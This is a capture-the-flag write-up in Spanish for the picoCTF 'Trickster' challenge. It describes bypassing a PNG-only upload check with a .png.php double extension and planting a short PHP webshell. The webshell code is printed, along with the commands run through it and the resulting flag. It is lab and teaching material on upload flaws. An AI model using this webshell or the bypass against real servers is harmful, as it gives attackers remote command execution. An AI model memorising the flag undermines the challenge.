**RETO:**  
Trickster

**DESCRIPCIÓN:**  
I found a web app that can help process images: PNG images only!  
Try it here! [http://atlas.picoctf.net:62326](http://atlas.picoctf.net:62326/)

**SOLUCIÓN:**

1. **Reconocimiento del sitio web**:
    
    - Accedí al sitio y encontré una aplicación web para procesar imágenes PNG
        
    - La interfaz permitía subir archivos pero indicaba restricción a solo formato PNG
        
    - Probé subir diferentes tipos de archivos para entender las validaciones
        
2. **Análisis de la vulnerabilidad**:
    
    - Identifiqué que la validación de archivos se realizaba principalmente en el frontend
        
    - La aplicación aceptaba archivos con doble extensión como `.php.png` o `.png.php`
        
    - Descubrí que archivos PHP disfrazados como PNG podían ser subidos y ejecutados
        
3. **Explotación exitosa**:
    
    - Creé un webshell PHP simple con el siguiente código:
        
    
    php
    
    <?php
    if(isset($_GET['cmd'])) {
        echo "<pre>";
        system($_GET['cmd']);
        echo "</pre>";
    }
    ?>
    
    - Subí el archivo como `webshell.png.php` burlando la validación de extensiones
        
    - La aplicación aceptó el archivo y lo almacenó en el directorio `/uploads/`
        
4. **Obtención de la flag**:
    
    - Accedí al webshell en: `http://atlas.picoctf.net:62326/uploads/webshell.png.php`
        
    - Usé el parámetro `cmd` para ejecutar comandos en el servidor
        
    - Ejecuté `ls -la ../` y descubrí un archivo sospechoso: `HFQWKODGMIYTO.txt`
        
    - Finalmente, ejecuté `cat ../HFQWKODGMIYTO.txt` para obtener la flag
        

**FLAG OBTENIDA:**  
`picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17}`

**NOTAS ADICIONALES:**

- Este reto demostró la importancia de validar **tanto en frontend como backend** los archivos subidos
    
- La técnica de usar doble extensión `.png.php` bypassó fácilmente la validación superficial
    
- El webshell PHP permitió ejecución remota de comandos, mostrando el grave impacto de esta vulnerabilidad
    
- La flag estaba oculta en un archivo con nombre aleatorio en el directorio principal
    

**REFERENCIAS:**

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
    
- [Unrestricted File Upload Vulnerability](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)